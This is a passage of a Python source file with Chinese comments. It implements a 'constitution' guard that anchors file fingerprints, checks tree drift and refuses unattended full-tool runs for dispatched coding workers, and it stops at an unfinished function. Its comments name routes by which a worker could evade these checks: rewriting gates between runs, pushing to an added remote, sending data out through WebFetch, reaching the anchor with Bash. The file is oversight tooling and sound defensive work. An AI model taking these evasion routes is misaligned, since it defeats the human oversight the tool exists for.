"""宪法执行层：什么必须停下来问人。

## 与闸的分工

| | 谁 | 回答什么 |
|---|---|---|
| **闸**（`gates.sh`，项目侧） | 项目自己定 | 这单活**干得合不合格** |
| **宪法**（本模块，工具侧） | 全项目统一 | 这单活**有没有越过红线** |

两者不可互相替代：闸红了是活没干好，宪法命中是**必须停下来问人**。

## 为什么是三个文件

| 文件 | 读者 | 会被解析吗 |
|---|---|---|
| `.devloop/constitution.md` | **人**（上报、复盘、审计） | ⛔ **绝不** |
| `.devloop/constitution.toml` | **脚本** | 是 |
| `../.devloop-anchors/<项目>.json` | 脚本 | 是，且**在项目外面** |

**理由一（本项目自己踩出来的）**：`gates.sh` 是脚本、`rules-digest.md` 是散文，
两者早就是分开的。而 `rules-digest.md` 里白纸黑字写着「`.devloop/` 任何文件禁改」,
**真正执行它的却是 `gates.sh` 里那段脚本**——散文改成什么都不影响执行。
宪法若只写成散文，就是第二个 rules-digest：**守卫的目标不存在**（第一种假绿）。

**理由二**：让脚本 grep 散文 = 判据的维度错了（第三种假绿）。
「不得修改基线」这句话，脚本无法从中导出「哪些路径、什么判据、哪个时刻判」。

**理由三**：两半的保护级别本来就不同。散文被改 → 上报文本失真；
判据表被改 → **守卫变空**（自指类顶格）。合成一个文件就只能取高的那档，
于是改个错别字也要走重新锚定流程，摩擦会让人绕过它。

**理由四（最要紧）**：判不了的条款必须能被**显式标注**，而散文承载不了这个标注。
TOML 里的 `[[unjudged]]` 是**机器可见的诚实声明**，`summary()` 每次都把它们印出来。
⛔ **「零命中」这句话必须永远带着「未覆盖 N 条」的尾巴**，否则它自己就是假绿。

## 判据为什么写在 Python 里而不是 gates.sh 里

1. `gates.sh` 每个接入项目一份，判据写进去 = 每个项目各实现一遍、各写错一遍。
2. `gates.sh` 普遍 `set -uo pipefail` + `2>/dev/null`，能把「变量没注入」和
   「git 参数非法」一起吞掉，然后打印一句自信的 PASS——与 G-36 同形。
3. 本模块住在工具本体里，**不在被审项目里**，工人在 worktree 中改不到它——
   这正是闸的防篡改第 1 道用的同一条理由。

⛔ 现有 `gates.sh` 里的守卫一律保留不动。宪法是它们**之上**的一层，不是替代。
"""

from __future__ import annotations

import hashlib
import json
import subprocess
import time
import tomllib
from dataclasses import dataclass, field
from pathlib import Path

from . import records as records_mod
from .config import ConfigError, ProjectPaths

SCHEMA = 1
ANCHOR_DIR = ".devloop-anchors"
#  ⭐ 锚自己的版本号。⛔ 原来没有——于是锚缺字段、字段改名、写到一半被中断，
#     三种都只能靠 `json.loads` 抛异常或**静默跳过判据**来表现。
#  ⚠️ **2 起**：`_sha` 从「原样字节」改成「先归一行尾」（G-97）。⛔ 指纹口径变了，
#     而旧锚（无 schema 字段）里存的是旧口径的值——分不出来就会把它报成
#     「A-1 受保护文件被改」，而文件一个字节都没动。⭐ 版本位就是用来分这个的。
ANCHOR_SCHEMA = 2


class NotEnabled(ConfigError):
    """这个项目**还没接入**宪法（文件根本不存在）。

    ⛔ 必须与「宪法存在但坏了」分开。早先两者都被降级成一句
    「⚠️ 未启用宪法」然后照常派单——于是 TOML 语法错、schema 不认、
    受保护文件写错路径、没登记 unjudged 这四种**本该退出码 2** 的硬错，
    全变成一行警告，之后 T0、T2、硬拒绝一个都不跑。
    而那句提示本身还是假话：**宪法在，只是坏了。**
    """


#  ⭐ 故障消息的截断上限。⚠️ 判据不是「砍多少字」，是**别把人要敲的命令砍掉**。
_ERR_CAP = 600


def _keep_命令(msg: str, cap: int = _ERR_CAP) -> str:
    """截断故障消息，⛔ 但**绝不把一条命令砍成半句**。

    ## 缺陷的形状（2026-08-03 实测）

    原来是 `self.stderr.strip()[:200]`。而「锚是旧口径写的、请重锚」那条消息
    第 201 个字正好落在命令中间，屏幕上停在：

    ```
    python -m devloop.cli constitution anchor --pro
    ```

    ⛔ **工具当时是停的，而它印给人的唯一一条自救命令敲不通。**
    ⚠️ 同一个毛病在 `nightly.py` 也犯过一次（砍 100 字），两次都恰好砍在
    「你该干什么」那一句上——⭐ 这不是巧合：**那句话总在最后**。

    ## ⭐ 判据

    截断点若落在某一行中间，就把那**整行**留全。
    ⚠️ 上限抬到 600 只是把常见消息装下，⛔ 真正管用的是这条「行不许断」的规矩。
    """
    m = msg.strip()
    if len(m) <= cap:
        return m
    #  ⚠️ 在 cap 之后找最近的换行——⛔ 不是在 cap 之前找，那样还是会丢掉半行。
    nl = m.find("\n", cap)
    return m if nl < 0 else m[:nl] + "\n   …（后面还有，完整内容见上面的报错）"


@dataclass(frozen=True)
class Hit:
    clause: str            # "A-1" / "C-4"
    title: str             # 从 toml 抄，⛔ 不从 .md 解析
    detail: str            # 具体证据：路径 + 期望 + 实际
    action: str = "halt"   # halt = 停机上报 · note = 只记账


@dataclass
class ConstitutionResult:
    code: int = 0          # 0 无命中 · 1 有命中 · 2 判定器自身故障
    hits: list[Hit] = field(default_factory=list)
    unjudged: list[str] = field(default_factory=list)
    stderr: str = ""
    #  ⭐ 判据**在代码里**的条款（`[[judged_elsewhere]]`）。⛔ 与 `unjudged` 分开：
    #     那些是**能判的**，说成「判不了」的代价是一句新的假话。
    #  ⛔ **必须排在最后。** 2026-08-03 我把它插在 `stderr` 前面，于是所有
    #     按位置传参的地方全部错位——`check_files` 的
    #     `ConstitutionResult(2, hits, con.unjudged, "受保护文件与锚不符")`
    #     把那句话喂给了 `elsewhere`，印出来是「另有 9 条判据在代码里
    #     （受、保、护、文、件、与、锚、不、符）」。⚠️ 给数据类加字段要加在末尾。
    elsewhere: list[str] = field(default_factory=list)

    @property
    def clean(self) -> bool:
        return self.code == 0

    @property
    def broken(self) -> bool:
        """判定器自己坏了——必须与「越线了」区分，与 `GateResult.gate_broken` 同源。"""
        return self.code == 2

    @property
    def halts(self) -> list[Hit]:
        return [h for h in self.hits if h.action == "halt"]

    def summary(self) -> str:
        # ⛔ 未覆盖条款每次都要报。「零命中」不带这句尾巴，就是把「没查」
        #    说成「查过了没事」——第一种与第六种假绿的合体。
        #  ⭐ 三档都要报。⚠️ 2026-08-03 实测：只报 `unjudged` 时印「未覆盖 7 条」，
        #     而散文里 18 条、这份 toml 只覆盖 10 条——**另外 6 条一个清单都没进**，
        #     它们靠代码挡着但账上看不见。⛔ 少报的那句尾巴本身就是假绿。
        tail = (f" · ⚠️ 未覆盖条款 {len(self.unjudged)} 条："
                f"{'、'.join(self.unjudged)}" if self.unjudged else
                " · ⚠️ 未登记任何「判不了」的条款——请确认这是真的")
        if self.elsewhere:
            tail += (f" · 另有 {len(self.elsewhere)} 条判据在代码里"
                     f"（{'、'.join(self.elsewhere)}）")
        if self.broken:
            # ⚠️ 故障时也要把已经查出来的命中列出来。早先只印 stderr，
            #    于是「锚对不上」这句话说了，**却没说是哪个文件对不上**——
            #    人拿到这条消息什么也做不了。诊断信息不许在故障路径上蒸发。
            why = "；".join(f"{h.clause} {h.title}（{h.detail}）" for h in self.hits)
            return (f"宪法判定器故障：{_keep_命令(self.stderr)}"
                    + (f" —— {why}" if why else "") + tail)
        notes = [h for h in self.hits if h.action == "note"]
        if not self.halts:
            s = "无宪法命中"
        else:
            s = "⛔ 宪法命中 " + "；".join(
                f"{h.clause} {h.title}（{h.detail}）" for h in self.halts)
        if notes:
            s += f" · 另有 {len(notes)} 条仅记账（{'、'.join(h.clause for h in notes)}）"
        return s + tail


@dataclass(frozen=True)
class Snapshot:
    """某一时刻的可比对状态。"""
    files: dict[str, str]   # 绝对路径 → SHA-256；⚠️ 文件不存在记 ""，与「未登记」区分
    refs: dict[str, str]    # refname → objectname
    taken_at: float
    #  ⭐ 不可恢复记录（各工作副本的 `.devloop/`）。⛔ **挂在快照里而不是
    #     另开一个参数**，是为了自动覆盖两条调用路径：`before` 已经由
    #     `cmd_dispatch` 和 `cmd_autopilot` **双双**传给 `_run_unit` 了。
    #     ⚠️ 新参数各接一遍正是这个项目栽过的坑——2026-07-29 那次
    #     `cmd_autopilot` 漏传 `before/ws_before/halt`，T5 三道宪法与撞额度
    #     停批在自动驾驶路径上**全是死的**，而单测全绿（它们直接调 `_run_unit`）。
    records: dict[str, "records_mod.Mark"] = field(default_factory=dict)
    #  ⭐ 远端清单 `名字 → URL`。⛔ **必须加在末尾**——G-95 的教训：
    #     给数据类插字段会让所有按位置传参的地方整体错位。
    #  ⚠️ 为什么要它：工人 `git remote add x <地址>` 再推过去，
    #     `refs/remotes/origin/*` 一条都不会变，光比 ref 看不见。
    remotes: dict[str, str] = field(default_factory=dict)


@dataclass(frozen=True)
class Protected:
    clause: str
    title: str
    path: str = ""
    glob: str = ""
    optional: bool = False
    allow_empty: bool = False   # 「今天匹配不到，但我就是要防它冒出东西」
    #  ⭐ 「改已有的算越线，**新建**不算」。⛔ 必须加在末尾（G-95 的教训）。
    #
    #  ⚠️ 为什么需要这一档：`tests/**` 的正确语义是**分级**的——
    #  工人改掉一条已有断言 = 改自己的考卷；而新写一个 `test_*.py` 恰恰是
    #  任务书要求他做的事。`gates.sh` 的「测试守卫」早就是这么分的，
    #  ⛔ 而树内判据原来只有「全判」一档，套上去会每单必红。
    #  ⭐ 天天红的守卫等于没有守卫。
    allow_added: bool = False


@dataclass(frozen=True)
class Constitution:
    project: Path
    files: list[Protected]      # 真实文件（worktree 之外），T0 登记 / T5 复验
    trees: list[Protected]      # worktree 内路径，base 锚定漂移判据
    unjudged: list[str]         # ⛔ 判不了的条款 ID，必须显式登记
    #  ⭐ 判据在代码里的条款 ID。⛔ 与 `unjudged` 分开——那些是**能判的**。
    elsewhere: list[str]
    refuse: dict
    source: Path
    tree_none_why: str = ""     # 显式声明「树内无可保护」的理由；非空 = 每次都印

    @property
    def anchor_path(self) -> Path:
        return self.project.parent / ANCHOR_DIR / f"{self.project.name}.json"

    def result(self, code: int, hits: list[Hit] | None = None, stderr: str = "",
               *, extra_unjudged: tuple[str, ...] = ()) -> "ConstitutionResult":
        """⭐ **一切结论都从这里出**——三档的账在这一处配平，不在十处各抄一遍。

        ⛔ 2026-08-03 的教训：`[[judged_elsewhere]]` 那一档加进来时，
        我在 10 个 `ConstitutionResult(...)` 构造点里**只记得给 2 个传**
        （而且那 2 个都是 `code=2` 的故障路径）。于是：

        | | |
        |---|---|
        | TOML 里 | 6 条登记好了 |
        | `test_constitution_coverage` | 全绿——它读的是 TOML |
        | ⛔ **人真正看到的那句尾巴** | 一次都没提过第三档 |

        ⚠️ 加那一档的**唯一目的**就是让尾巴别少报，而它在输出里整个落空了。
        与 G-94（`--discard` 实现了但控制流够不着）同一个形状：
        **实现了，生产路径够不着。**

        ⭐ 所以修法不是「把 8 处补齐」——那只是把同一个错再抄一遍的机会往后挪。
        判据落在**结构**上：`ConstitutionResult` 只许从 `Constitution` 长出来，
        由 `tests/test_constitution_result_from_con.py` 钉住。
        """
        return ConstitutionResult(code, list(hits or []),
                                  self.unjudged + list(extra_unjudged),
                                  stderr, list(self.elsewhere))


def _sha(p: Path) -> str:
    """受保护文件的指纹。⭐ **先把行尾归一再哈希**（G-97）。

    ## ⛔ 不归一会怎样（2026-08-03 在真仓上实地撞到）

    锚存的是**磁盘字节**，而 git 在 `core.autocrlf=true` 下存 LF、检出给 CRLF。
    于是一条完全正常的动作就能把锚打穿：

    ```
    改了 .devloop/rules-digest.md 一行  →  git checkout -- 那个文件（撤销手滑）
      → git 重写它，autocrlf 把它写成 CRLF
        → 指纹 52a4e7a65dd2 → 16bf911827d6
          → ⛔ A-1 命中：「受保护文件与锚不符」——而**内容一个字都没变**
    ```

    ⚠️ 触发条件比我最初报的窄、又比对抗复核说的宽——**两边都错了**：

    | | 说法 | 实际 |
    |---|---|---|
    | 我最初 | clone / checkout / stash 都会炸 | ⛔ 太宽：未修改的文件 git 直接跳过重写 |
    | 对抗复核 | checkout 从不重写，所以不成立 | ⛔ 太窄：那只对**未修改**的文件成立 |
    | ⭐ 真相 | **改过之后再用 git 还原**，就会重写 → 就会炸 | 实测复现 |

    ⭐ 而「改错了撤销一下」是每天都会做的动作。⛔ 更坏的是人对误报的自然反应
    是「重锚一下就好」——那正是设计明令禁止的自愈（`cmd_constitution` 的注释：
    「锚一旦能自愈，它就不是锚」）。**一个会误报的停机判据，会把自己训练成橡皮图章。**

    ## ⭐ 附带修好的第二件事

    归一之后，指纹**可以从 git 内容推导**了。⚠️ 在此之前不行——我想把锚里的
    指纹对应到某个提交、好回答「这文件到底被谁改过」，**一个提交都对不上**。
    那是审计时的第一个动作，而它做不了。

    ## ⚠️ 诚实标注

    只归一 `\\r\\n` → `\\n`。⛔ 代价：两个仅行尾不同的**二进制**文件会哈希相同。
    受保护清单里放的是 toml / md / sh（人声明的文本配置），这个代价可接受——
    但如果有人把二进制文件加进 `[[protected_file]]`，这条要重新评估。
    """
    if not p.is_file():
        return ""
    return hashlib.sha256(p.read_bytes().replace(b"\r\n", b"\n")).hexdigest()


def _abs(project: Path, spec: str) -> Path:
    p = Path(spec)
    return p if p.is_absolute() else project / spec


# ── 加载 ──────────────────────────────────────────────────────

def load(paths: ProjectPaths) -> Constitution:
    """读 `.devloop/constitution.toml`。

    ⛔ 下列情形一律 `raise ConfigError`（退出码 2，**不派单**）：
      · 文件不存在 · TOML 语法错 · schema 版本不认识
      · `protected_file` 里某个**非 optional** 的路径在盘上不存在

    ⭐ 最后那条是「守卫的目标不存在」的正面防线：**清单写错路径必须当场炸**，
    而不是安静地保护一个空集合、然后每次都报「无命中」。
    """
    f = paths.project / ".devloop" / "constitution.toml"
    if not f.exists():
        raise NotEnabled(
            f"缺 {f}。宪法是自动驾驶的前置——没有它就没有「什么必须停下来问人」。\n"
            f"   模板：{Path(__file__).parent.parent / 'templates' / 'constitution.toml'}")
    try:
        # utf-8-sig：这是人手写的文件，Windows 编辑器加 BOM 是现实输入，
        # 而 tomllib 撞上 BOM 只会报「line 1 column 1」，既不提 BOM 也不提文件名。
        data = tomllib.loads(f.read_text(encoding="utf-8-sig"))
    except tomllib.TOMLDecodeError as exc:
        raise ConfigError(
            f"{f} 不是合法 TOML：{exc}\n"
            f"   ⚠️ 这是人手写的文件——先检查编辑器有没有加 BOM，"
            f"以及路径里的反斜杠是否需要改用单引号字面串。") from exc

    ver = data.get("schema")
    if ver != SCHEMA:
        raise ConfigError(
            f"{f} 的 schema = {ver!r}，本工具只认 {SCHEMA}。"
            f"版本不同意味着判据语义可能变了——在人确认之前拒绝执行。")

    def _load(key: str) -> list[Protected]:
        out = []
        for i, row in enumerate(data.get(key, [])):
            if not row.get("path") and not row.get("glob"):
                raise ConfigError(f"{f} 的 [[{key}]] 第 {i + 1} 条既没有 path 也没有 glob")
            # ⛔ `[[protected_file]]` 写 glob 会被**静默忽略**：整条链路
            #    （write_anchor / snapshot / verify_anchor / check_files）
            #    都带 `if p.path` 过滤，于是锚里空空如也，而它看起来在保护什么。
            if key == "protected_file" and row.get("glob"):
                raise ConfigError(
                    f"{f} 的 [[protected_file]] 第 {i + 1} 条写了 glob。\n"
                    f"   ⛔ 受保护**文件**只接受 path（要逐个算指纹）。\n"
                    f"   写成 glob 会被整条链路静默忽略——锚里一条都不记，"
                    f"而它看起来在保护什么。要用通配请改用 [[protected_tree]]。")
            out.append(Protected(
                clause=row.get("clause", "?"), title=row.get("title", ""),
                path=row.get("path", ""), glob=row.get("glob", ""),
                optional=bool(row.get("optional", False)),
                allow_empty=bool(row.get("allow_empty", False)),
                allow_added=bool(row.get("allow_added", False))))
        return out

    #  ⛔ **本工具只解析这两个 `protected_*`。** 写了别的一律当场炸。
    #
    #  ⚠️ 2026-08-03 对抗审计查出：`tests/test_constitution_coverage.py` 的
    #     三档统计把 `protected_ref` 算进「有机械判据」那一档，⛔ 而 `load()`
    #     从来不解析它。于是往 toml 里加一条
    #         [[protected_ref]] clause = "A-2"
    #     覆盖率测试立刻转绿、`summary()` 的「未覆盖 N 条」尾巴少一条，
    #     **而 A-2 的判据一行都没多**。
    #  ⭐ 那是一个**静默后门**：让账做平的最省事办法，是往清单里写一个
    #     没人执行的名字。⛔ 与 rules-digest 那次教训同形，只是方向反了。
    known_keys = {"protected_file", "protected_tree"}
    stray = sorted(k for k in data
                   if k.startswith("protected_") and k not in known_keys)
    if stray:
        raise ConfigError(
            f"{f} 里有本工具**不解析**的清单：{'、'.join(stray)}。\n"
            f"   ⛔ 登记了却没人执行 = 守卫的目标不存在，"
            f"而账面看起来是覆盖了的。\n"
            f"   ⭐ 只有 [[protected_file]]（对账项目外的锚）与 "
            f"[[protected_tree]]（base 锚定的树内漂移）会被真正执行。")

    files = _load("protected_file")
    trees = _load("protected_tree")

    # ⭐ 守卫的目标必须真实存在
    missing = [p.path for p in files
               if p.path and not p.optional and not _abs(paths.project, p.path).exists()]
    if missing:
        raise ConfigError(
            f"{f} 登记的受保护文件在盘上不存在：{'、'.join(missing)}\n"
            f"   ⛔ 这是「守卫的目标不存在」——清单写错路径比没有清单更坏，"
            f"因为它会每次都报「无命中」。要么修路径，要么标 optional = true。")

    # ⛔ 指向**目录**的受保护文件是空守卫：算指纹的函数对目录返回空字符串，
    #    锚里记空，复验时空等于空——**把整个目录删掉都报「无宪法命中」**。
    #    而 `.exists()` 对目录为真，所以上面那条存在性校验放行了它。
    dirs = [p.path for p in files
            if p.path and _abs(paths.project, p.path).is_dir()]
    if dirs:
        raise ConfigError(
            f"{f} 的受保护文件指向的是**目录**：{'、'.join(dirs)}\n"
            f"   ⛔ 目录算不出指纹（返回空串），锚里记空、复验时空等于空——"
            f"把整个目录删掉都会报「无宪法命中」。\n"
            f"   要保护整个目录，请改用 [[protected_tree]] 配 glob。")

    # ⛔ 受保护目录的模式今天一个文件都匹配不到 —— 多半是写错了。
    #    ⚠️ 但「今天匹配不到」未必是错的：树内判据也负责抓「受保护目录下
    #    冒出新文件」，而那个目录今天可以是空的甚至不存在。
    #    所以判据不是「必须匹配到」，而是**必须显式认领**——
    #    与文件那侧的 optional 同一条路子。
    #  ⭐ 2026-08-03：判据从「**盘上**有没有」改成「**git 认不认得**」。
    #
    #  ⛔ 判在盘上，两个方向都错：
    #
    #  | 情形 | 盘上判据 | 真相 |
    #  |---|---|---|
    #  | 项目没把 `.devloop/` 纳入版本库（如 eco-ob） | ✅ 通过（盘上有 168 个文件） | ⛔ `check_tree` 从 `ls-tree base` 取清单，**一个都看不见**——守卫永远空转 |
    #  | 工人把 `tests/` 全删了 | ⛔ 拒绝加载「模式匹配不到」 | ⭐ 那些文件在 base 里，`check_tree` 正好能抓到「被删除」 |
    #
    #  ⚠️ 后者尤其反常：**守卫恰好在它该报警的时候把自己关掉**。
    #  ⭐ 改用 `git ls-files` + 生产判据 `_match`——与 `check_tree` 同一套匹配逻辑，
    #     不会一边宽一边窄。
    known = _tracked_paths(paths.project)
    if known is None and trees:
        raise ConfigError(
            f"{paths.project} 不是 git 仓库，却配了 {len(trees)} 条 "
            f"[[protected_tree]]。\n"
            f"   ⛔ 树内判据从 `git ls-tree <base>` 取清单——没有版本库，"
            f"它**一条路径都看不见**，会永远报「无宪法命中」。\n"
            f"   ⚠️ 这不是可以将就的情形：守卫的目标不存在，而它每单都报绿。")
    known = known or []
    empty = []
    for p in trees:
        if p.allow_empty:
            continue
        pat = p.glob or p.path
        if not any(_match(rel, pat) for rel in known):
            empty.append(pat)
    if empty:
        raise ConfigError(
            f"{f} 的受保护目录模式在当前项目里**没有任何被 git 跟踪的文件**匹配："
            f"{'、'.join(empty)}\n"
            f"   ⛔ 这多半是写错了（多写少写一层目录、大小写、繁简）——"
            f"而写错的模式会**永远报「无命中」**。\n"
            f"   ⚠️ 判的是 `git ls-files` 而不是盘上的文件：树内判据从 "
            f"`git ls-tree <base>` 取清单，**没进版本库的文件它一个都看不见**。\n"
            f"   若确实是「现在为空、就是要防它冒出东西」，"
            f"请在该条上显式写 allow_empty = true。")

    # ⛔ 一条受保护目录都没有 = T2 判据覆盖 0 条路径。
    #    与 G-53（闸一条都没验却报全过）完全同形，所以处置也一样：
    #    **要么判它，要么显式登记你不判**，不许沉默地报绿。
    tree_cov = data.get("tree", {})
    if not trees and tree_cov.get("coverage") != "none":
        raise ConfigError(
            f"{f} 一条 [[protected_tree]] 都没有。\n"
            f"   ⛔ 那意味着树内判据覆盖 **0 条路径**，却每单都报「无宪法命中」"
            f"——与「闸一条都没验却报全过」是同一种假绿。\n"
            f"   要么补上受保护路径，要么显式声明：\n"
            f"       [tree]\n"
            f"       coverage = \"none\"\n"
            f"       why = \"<为什么这个项目树内无可保护>\"\n"
            f"   声明之后每次判定都会把这句话印出来。")

    #  ⭐ 判据在代码里的那一档。⛔ 每条必须写明 `by`（谁在挡）——
    #     不写就是一个**无法核实的声明**，那正是本项目一直在防的形态。
    elsewhere = [e.get("clause", "?") for e in data.get("judged_elsewhere", [])]
    bad_by = [e.get("clause", "?") for e in data.get("judged_elsewhere", [])
              if len(str(e.get("by", ""))) < 9]
    if bad_by:
        raise ConfigError(
            f"{f} 里这几条声称判据在代码里，却没写明**谁在挡**：{bad_by}\n"
            f"   ⛔ 一个无法核实的声明比没有声明更坏——它看起来像是覆盖到了。")

    unjudged = [u.get("clause", "?") for u in data.get("unjudged", [])]
    if not unjudged:
        raise ConfigError(
            f"{f} 没有登记任何 [[unjudged]] 条款。\n"
            f"   ⛔ 这几乎一定是漏写了：宪法里必然有判不了的条款"
            f"（对外发送、设计决策变更、例外层自认拿不准…）。\n"
            f"   不登记它们，`summary()` 就会印出一句没有尾巴的「无宪法命中」，"
            f"而那句话本身就是假绿。")

    return Constitution(paths.project, files, trees, unjudged, elsewhere,
                        data.get("refuse", {}), f,
                        tree_none_why=tree_cov.get("why", "") if not trees else "")


# ── T0：起任何进程之前 ─────────────────────────────────────────

def refuse_preflight(con: Constitution, *, tools: str, unattended: bool) -> None:
    """命中就 `raise ConfigError`（退出码 2）。⛔ 在花任何钱、建任何 worktree 之前。

    ## ⛔ 参数叫 `unattended` 而不是 `detach`（2026-08-03 改名）

    原来叫 `detach`，于是判据事实上挂在**一个命令行开关**上。
    ⚠️ 而 `cmd_autopilot` 走的是另一条路，**从头到尾没调用过本函数**——
    在计划里写 `tools = "full"` 跑自动驾驶，工人整夜握着 WebFetch，
    `[refuse] full_tools_when_detached = true` 这行配置在那条路上是**纯装饰**。

    ⭐ 判据要挂在「**这条路有没有人在看**」上，不挂在开关上：
    自动驾驶按定义就是没人看，所以 `autopilot.preflight` 恒传 `unattended=True`。

    当前唯一一条：`tools == "full"` + 无人值守。
    `full` 与 `implement` 的唯一差别就是 **WebFetch**（见 `dispatch.py`）——
    也就是说 full 档在无人值守下开了一条**对外通道**，而对外发送事后**零痕迹**：
    diff 里没有、台账里没有、回执里也没有。判不了就只能事前不给能力。
    """
    # ⛔ 有些项目**天生不该被写**——评测集的冻结基准就是典型：
    #    往里写一个字，`check_baseline` 就会因为工作区变脏而拒绝跑分，
    #    整套评测的分母就没了。
    #    ⚠️ 正确的做法**不是给它补个闸**（闸是用来裁决写操作的，补了等于邀请人写），
    #    而是在起任何进程之前就拒绝。
    if con.refuse.get("no_writes") and tools != "readonly":
        raise ConfigError(
            f"⛔ 宪法拒绝：本项目声明了 `no_writes`——**不接受任何写操作**。\n"
            f"   理由：{con.refuse.get('why') or '（未写理由，请补上）'}\n"
            f"   你给的是 --tools {tools}。只读任务（--tools readonly）照常可派。")

    if (con.refuse.get("full_tools_when_detached", True)
            and tools == "full" and unattended):
        raise ConfigError(
            "⛔ 宪法拒绝：`--tools full` + 无人值守 = 没人看管的对外通道。\n"
            "   full 比 implement 多的就是 WebFetch，而「对外发送」事后零痕迹——\n"
            "   diff、台账、回执里都不留证据，**判不了，只能事前不给能力**。\n"
            "   ⚠️ 自动驾驶按定义就是无人值守，这条对它恒成立。\n"
            "   要么别走自动驾驶 / 去掉 --detach（人看着跑），"
            "要么把这一单改成 --tools implement。")


def write_anchor(paths: ProjectPaths, con: Constitution) -> Path:
    """把当前受保护文件的指纹写到**项目外**的锚文件里。

    ⛔ **绝不由派单链路调用**——这是一个需要人执行的命令
    （`devloop constitution anchor`）。

    ⚠️ 为什么锚必须来自人的命令：派单链路现在的做法是每次现读现登记指纹，
    于是**工人在两次派单之间改掉闸，下一轮就把被改后的值登记成「正确」**，
    篡改静默转正。锚一旦能自愈，它就不是锚。

    ⚠️ 诚实标注：锚放项目外只**提高篡改成本，不是安全边界**——
    工人有 Bash，理论上够得到。真边界是事前剥夺能力。
    """
    a = con.anchor_path
    a.parent.mkdir(parents=True, exist_ok=True)
    #  ⭐ 旧锚另存 `.prev`：「上一次的基准是什么」必须事后可查。
    #     ⚠️ 2026-08-03 复核指出，原来是**原地覆盖、不留备份**——
    #     于是一次误锚之后，没有任何办法知道之前锚的是什么。
    if a.exists():
        a.with_suffix(a.suffix + ".prev").write_bytes(a.read_bytes())
    #  ⛔ 先写临时文件再原子改名。原来是直接 `write_text`，写到一半被中断
    #     就留下半个 JSON，之后每次派单都以「Unterminated string…」退出码 2 失败，
    #     而那句错误既不提锚、也不提文件名，人会往任务书和 toml 上排查。
    tmp = a.with_suffix(a.suffix + ".tmp")
    tmp.write_text(json.dumps({
        "schema": ANCHOR_SCHEMA,
        "project": str(paths.project), "at": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "constitution_sha": _sha(con.source), "files": files_now(paths, con),
    }, ensure_ascii=False, indent=1), encoding="utf-8")
    tmp.replace(a)
    return a


def files_now(paths: ProjectPaths, con: Constitution) -> dict[str, str]:
    """当前盘上受保护文件的指纹表。⭐ 抽出来是为了让 `anchor_delta` 与
    `write_anchor` **用同一份计算**——两处各写一遍就是下一个「一边宽一边窄」。"""
    return {p.path: _sha(_abs(paths.project, p.path)) for p in con.files if p.path}


def read_anchor(con: Constitution) -> tuple[dict | None, str]:
    """读锚。返回 `(记录, 出错原因)`——⛔ 两者恰有一个非空。

    ⚠️ 三种坏法必须分开，因为人拿到消息之后要做的事完全不同：

    | 情形 | 人该做什么 |
    |---|---|
    | 锚不存在 | 跑一次 `constitution anchor` |
    | 锚不是合法 JSON | ⭐ 上次 anchor 写到一半被中断了，重跑 |
    | 锚缺字段 / schema 不认 | 版本对不上，查清楚再重锚 |

    ⛔ 原来只有第一种被处理，后两种直接让 `json.loads` 往上抛，
    错误文本是「Unterminated string starting at: line 4 column 22」——
    既不提锚路径，也不提这是锚坏了，排查方向被带偏。
    """
    a = con.anchor_path
    if not a.exists():
        return None, (f"没有锚文件 {a}。先跑 `devloop constitution anchor "
                      f"--project {con.project}` 把当前状态登记为基准"
                      f"（那是一个需要你亲自执行的命令）。")
    try:
        rec = json.loads(a.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, UnicodeDecodeError) as exc:
        return None, (f"锚文件 {a} 不是合法 JSON：{exc}。"
                      f"⚠️ 多半是上次 anchor 写到一半被中断了——重跑一次 "
                      f"`devloop constitution anchor`。")
    if not isinstance(rec, dict):
        return None, f"锚文件 {a} 的顶层不是对象。"
    #  ⛔ 形状校验。⚠️ 缺 `constitution_sha` 时，A-1 那条**自指判据会被静默跳过**
    #     （原代码 `if rec.get("constitution_sha") and ...`），而 summary() 照常
    #     印「无宪法命中」——宪法本身可被任意修改而永远零命中。
    for k in ("constitution_sha", "files"):
        if not rec.get(k):
            return None, (f"锚文件 {a} 缺 `{k}`——锚的结构不认识，"
                          f"⛔ 拒绝在这种锚上做判定。请重新 anchor。")
    ver = rec.get("schema", 0)
    if ver > ANCHOR_SCHEMA:
        return None, (f"锚文件 {a} 的 schema = {ver!r}，本工具只认到 "
                      f"{ANCHOR_SCHEMA}。版本更新意味着判据语义可能变了。")
    #  ⛔ **旧口径的锚不许拿来判「文件被改了」。**
    #
    #  ⚠️ 2026-08-03 实测：`_sha` 从「原样字节」改成「先归一行尾」（G-97）之后，
    #     一个 **2026-07-29 之后一个字节都没动过**的 `gates.sh` 被报成
    #     「A-1 不得修改闸（指纹 1ba050671d2f → 6048d3871559）」，
    #     两条派单路径全停，退出码 2。
    #  ⛔ 那句话字面为假，而它恰好长得像**真出事**的样子——
    #     人会去查一个根本不存在的篡改。⭐ 版本位就是用来分开这两件事的。
    if ver < ANCHOR_SCHEMA:
        return None, (
            f"锚文件 {a} 是**旧口径**写的（schema {ver} < {ANCHOR_SCHEMA}）。\n"
            f"   ⭐ 指纹算法变了（现在先把行尾归一再哈希，见 G-97），"
            f"旧锚里的值没法直接比。\n"
            f"   ⛔ **这不代表任何文件被改过。** 重锚一次即可：\n"
            f"      python -m devloop.cli constitution anchor --project {con.project}\n"
            f"   ⚠️ 重锚会先把逐条差异印给你看——那些差异是**口径变化**，"
            f"不是篡改。")
    return rec, ""


def peek_anchor(con: Constitution) -> dict:
    """尽力读出锚里的内容，⛔ **只许给「印给人看」用，绝不许拿来判定**。

    ## ⛔ 为什么要和 `read_anchor` 分开（2026-08-03 实测）

    `read_anchor` 对坏锚 / 旧锚一律返回 `None`——**那是对的**，判定基准不可信
    就不该拿来判。⚠️ 但 `anchor_delta` 和 CLI 的「登记于 …」也在用它，
    而它们的活是**告诉人现在是什么情况**，完全不同的一件事。

    后果（用户真撞到的）：旧口径的锚被 `read_anchor` 拒了 → `old_files` 变成空
    → 差异表把 5 个**明明在锚里**的文件全印成「（当时不存在）」，
    「登记于」印成「（读不出来）」，还把一个**新旧指纹完全一样**的文件
    列进了「你要批准的东西」。

    ⭐ **那张差异表存在的唯一理由，就是让人看清自己在批准什么——而它给了假的。**

    ⛔ 判定路径永远走 `read_anchor`；本函数只喂给 `print`。
    """
    a = con.anchor_path
    if not a.is_file():
        return {}
    try:
        rec = json.loads(a.read_text(encoding="utf-8"))
    except Exception:      # noqa: BLE001 —— 读不出来就是空，⛔ 不许让展示路径抛
        return {}
    return rec if isinstance(rec, dict) else {}


def anchor_delta(paths: ProjectPaths, con: Constitution
                 ) -> list[tuple[str, str, str]]:
